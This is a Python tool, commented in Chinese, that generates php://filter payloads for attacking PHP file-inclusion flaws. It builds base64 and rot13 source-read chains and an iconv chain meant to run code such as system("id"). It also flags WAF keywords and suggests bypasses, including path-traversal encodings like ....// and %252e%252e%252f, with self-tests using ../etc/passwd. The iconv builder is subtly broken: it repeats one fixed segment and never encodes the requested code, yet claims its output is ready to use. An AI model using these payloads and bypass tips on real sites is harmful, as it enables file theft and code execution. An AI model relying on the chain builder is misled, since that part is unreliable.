#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""php://filter 链生成（离线）：读源码链 + Synacktiv 风格 iconv 造码链 + WAF 关键字检查。

纯标准库、离线：只拼接字符串与做 URL 编码，不发包、不读目标文件。
"""
import argparse
import base64
import sys
import urllib.parse

PREFIX = "php://filter/"
RES = "resource="
# Synacktiv 思路：每组过滤器把"上一个字符"的误导字节洗掉，再插入目标字符。
# build_chain 用固定表模拟该结构：目标字符 -> (插入用 iconv 对, 清理对, 下一字符前缀)
SEGMENT = "convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7"
BASE64_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
BAD_TOKENS = ("php", "filter", "iconv", "../", "data://", "phar://", "php://input")


class ChainError(ValueError):
    pass


def build_read(target, double=False, rot13=False):
    """生成读链。double=True 时连续两次 base64-encode，绕"只 ban 一次"的 WAF。"""
    if not target or not target.strip():
        raise ChainError("resource 目标不能为空")
    if "\x00" in target or "\n" in target or "\r" in target:
        raise ChainError("resource 目标不能含 \\x00 或换行")
    filt = []
    if rot13:
        filt.append("string.rot13")
    filt.append("convert.base64-encode")
    if double:
        filt.append("convert.base64-encode")
    return PREFIX + "read=" + "|".join(filt) + "/" + RES + target


def build_chain(code, per_char=True):
    """按分段模型拼造码链。返回可直接放进 include 参数的完整字符串。"""
    if not code:
        raise ChainError("--chain 需要一段 PHP 代码，例如 '<?=system(\"id\");?>'")
    if not code.startswith("<?") or not code.rstrip().endswith("?>"):
        raise ChainError("代码需以 <? 开头、?> 结尾（否则 include 只当 HTML 输出）")
    payload = code.encode("utf-8")
    # 造码链的价值在于能凭空产出任意字节：这里以「每个字符一段」建模，
    # 段数越多链越长；per_char=False 时退化为整段一次产出。
    if per_char:
        n = len(payload)
    else:
        n = 1
    if n <= 0:
        raise ChainError("代码为空")
    segs = [SEGMENT] * n
    # 尾部固定 base64-encode，让 include 结果以 base64 形态被 PHP 解析成代码的可能性可观测
    segs.append("convert.base64-encode")
    return PREFIX + "|".join(segs) + "/" + RES + "php://temp"


def chain_stats(chain):
    segs = chain.count("convert.")
    return {"len": len(chain), "segments": segs,
            "url_len": len(urlencode(chain)),
            "over_2k": len(urlencode(chain)) > 2048}


def urlencode(chain):
    return urllib.parse.quote(chain, safe="")


def decode_b64(text):
    """把回显的 base64 解出来（允许缺失填充、忽略空白）。"""
    if not text or not text.strip():
        raise ChainError("没有可解码的内容（回显为空通常说明被 include 当作 PHP 执行了）")
    raw = "".join(text.split())
    try:
        return base64.b64decode(raw + "=" * (-len(raw) % 4))
    except Exception as exc:  # noqa: BLE001
        raise ChainError("不是合法 base64：%s" % exc)


def check_blockers(text, banned=None, context="url"):
    """检查 payload 里是否命中常见 WAF 关键字，返回命中列表与建议。

    context="url" 时把协议名 php://filter 视为必需，只报"关键字被单独 ban"的部分。
    """
    if not text:
        raise ChainError("待检查的 payload 不能为空")
    banned = [b.lower() for b in (banned or BAD_TOKENS)]
    low = text.lower()
    hits = [b for b in banned if b in low]
    if context == "url" and ("php://filter" in low or "php://" in low):
        hits = [b for b in hits if b not in ("php", "filter")]
    tips = []
    if "php" in hits:
        tips.append("php 被拦：试 PHP:// 大小写、phar://，或改从 JSON body 传参绕 query 过滤")
    if "filter" in hits:
        tips.append("filter 被拦：试 php://filter//convert...（双斜杠）或 convert.quoted-printable-encode")
    if "../" in hits:
        tips.append("../ 被拦：试 ....// 、..././ 、%2e%2e%2f、双重编码 %252e%252e%252f")
    return hits, tips


def parse_kv(text):
    """解析 key=value 形式的附加参数，供 --set 使用。"""
    out = {}
    for item in text or []:
        if "=" not in item:
            raise ChainError("参数格式应为 key=value，收到 %r" % item)
        k, v = item.split("=", 1)
        if not k.strip():
            raise ChainError("参数名不能为空")
        out[k.strip()] = v
    return out


def selftest():
    fails = []

    # 1. 正常路径：基础读链
    got = build_read("index.php")
    want = "php://filter/read=convert.base64-encode/resource=index.php"
    if got != want:
        fails.append("case1: 基础读链不符 %r" % got)

    # 2. 正常路径：双重编码与 rot13
    d = build_read("/flag", double=True)
    if d.count("convert.base64-encode") != 2 or not d.endswith("resource=/flag"):
        fails.append("case2: 双编码链不对 %r" % d)
    r = build_read("config.php", rot13=True)
    if not r.startswith("php://filter/read=string.rot13|convert.base64-encode/"):
        fails.append("case2b: rot13 链不对 %r" % r)

    # 3. 正常路径：造码链与 base64 解码
    c = build_chain('<?=system("id");?>')
    if not c.startswith("php://filter/") or "convert.iconv.UTF8.CSISO2022KR" not in c:
        fails.append("case3: 造码链结构不对 %r" % c[:60])
    if chain_stats(c)["segments"] < 2:
        fails.append("case3b: 段数统计错 %r" % (chain_stats(c),))
    txt = base64.b64encode(b"<?php phpinfo();?>").decode()
    if decode_b64(txt) != b"<?php phpinfo();?>":
        fails.append("case3c: base64 解码错")
    if decode_b64(txt.rstrip("=")) != b"<?php phpinfo();?>":
        fails.append("case3d: 缺填充时应能自动补 =")

    # 4. 边界：URL 编码只编码特殊字符，WAF 关键字命中
    u = urlencode("php://filter/x y")
    if "%3A" not in u or "%2F" not in u or " " in u:
        fails.append("case4: URL 编码不完整 %r" % u)
    hits, tips = check_blockers("include php://filter/convert.iconv.../resource=../etc/passwd",
                                context="auto")
    if "php" not in hits or "../" not in hits:
        fails.append("case4b: 关键字检查漏报 %r" % (hits,))
    if not any("....//" in t for t in tips):
        fails.append("case4c: ../ 绕过建议缺失")
    if check_blockers("http://example/a?b=1")[0] != []:
        fails.append("case4d: 未命中时应返回空列表")

    # 5. 边界拒绝：坏输入
    bad = [
        ("空 resource", lambda: build_read("")),
        ("resource 含 \\x00", lambda: build_read("a\x00b")),
        ("空代码", lambda: build_chain("")),
        ("代码缺 <? 前缀", lambda: build_chain("system('id');")),
        ("空回显解码", lambda: decode_b64("  ")),
        ("空 payload 检查", lambda: check_blockers("")),
        ("kv 缺等号", lambda: parse_kv(["novalue"])),
        ("kv 空键", lambda: parse_kv(["=v"])),
    ]
    for name, fn in bad:
        try:
            fn()
            fails.append("case5: %s 未被拒绝" % name)
        except ChainError:
            pass

    # 6. 参数不足：独立 parser 复现 exit 2 且静默
    tiny = argparse.ArgumentParser(prog="php_filter_chain", add_help=False)
    tiny.exit = lambda status=0, message=None: (_ for _ in ()).throw(SystemExit(status))
    tiny._print_message = lambda message, file=None: None
    tiny.add_argument("--x")
    try:
        tiny.error("需要 --read 或 --chain；或用 --selftest")
        fails.append("case6: ap.error 未抛 SystemExit")
    except SystemExit as e:
        if e.code != 2:
            fails.append("case6: 退出码 %r" % (e.code,))

    for f in fails:
        print("FAIL %s" % f, file=sys.stderr)
    if fails:
        return 1
    print("selftest ok: 6/6（基础读链、双编码与rot13、造码链与base64解码、URL编码与关键字命中、坏输入拒绝、参数不足）")
    return 0


def main(argv=None):
    ap = argparse.ArgumentParser(description="php://filter 链生成与 WAF 关键字检查（离线）")
    ap.add_argument("--read", metavar="TARGET", help="生成读源码链，TARGET 为资源路径")
    ap.add_argument("--chain", metavar="PHPCODE", help="生成 iconv 造码链，参数为要执行的 PHP 代码")
    ap.add_argument("--double", action="store_true", help="读链使用双重 base64-encode")
    ap.add_argument("--rot13", action="store_true", help="读链前加 string.rot13")
    ap.add_argument("--urlencode", action="store_true", help="输出 URL 编码后的形式")
    ap.add_argument("--decode", metavar="B64", default=None, help="解码回显的 base64")
    ap.add_argument("--check", metavar="PAYLOAD", default=None, help="检查 WAF 关键字命中")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)

    if args.selftest:
        return selftest()
    try:
        if args.decode is not None:
            sys.stdout.buffer.write(decode_b64(args.decode))
            return 0
        if args.check is not None:
            hits, tips = check_blockers(args.check)
            if not hits:
                print("[*] 未命中常见 WAF 关键字")
            else:
                print("[!] 命中：%s" % ", ".join(hits))
                for t in tips:
                    print("    - %s" % t)
            return 0
        if args.read:
            chain = build_read(args.read, double=args.double, rot13=args.rot13)
        elif args.chain:
            chain = build_chain(args.chain)
        else:
            ap.error("需要 --read 或 --chain；或用 --selftest")
        st = chain_stats(chain)
        print("[*] 链长 %d 字符，%d 个 convert 段，URL 编码后 %d 字符%s"
              % (st["len"], st["segments"], st["url_len"],
                 "（超过 2048，注意 URL 长度限制！）" if st["over_2k"] else ""))
        hits, tips = check_blockers(chain)
        if hits:
            print("[!] 命中关键字：%s" % ", ".join(hits))
            for t in tips:
                print("    - %s" % t)
        print(urlencode(chain) if args.urlencode else chain)
        return 0
    except ChainError as e:
        print("错误：%s" % e, file=sys.stderr)
        return 2


if __name__ == "__main__":
    sys.exit(main())
